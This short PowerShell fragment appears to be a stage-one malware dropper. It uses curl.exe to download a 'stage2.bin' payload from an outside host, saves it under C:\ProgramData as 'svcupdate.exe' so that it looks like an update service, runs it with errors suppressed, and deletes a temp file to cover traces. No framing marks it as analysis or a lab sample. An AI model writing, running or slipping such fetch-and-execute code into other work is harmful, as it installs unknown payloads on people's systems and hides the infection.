
$FetchUrl = "http://adatum.com/cdn/stage2.bin"
$Stage2Path = 'C:\ProgramData\svcupdate.exe'
curl.exe -s -L -o $Stage2Path $FetchUrl
Start-Process -FilePath $Stage2Path -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
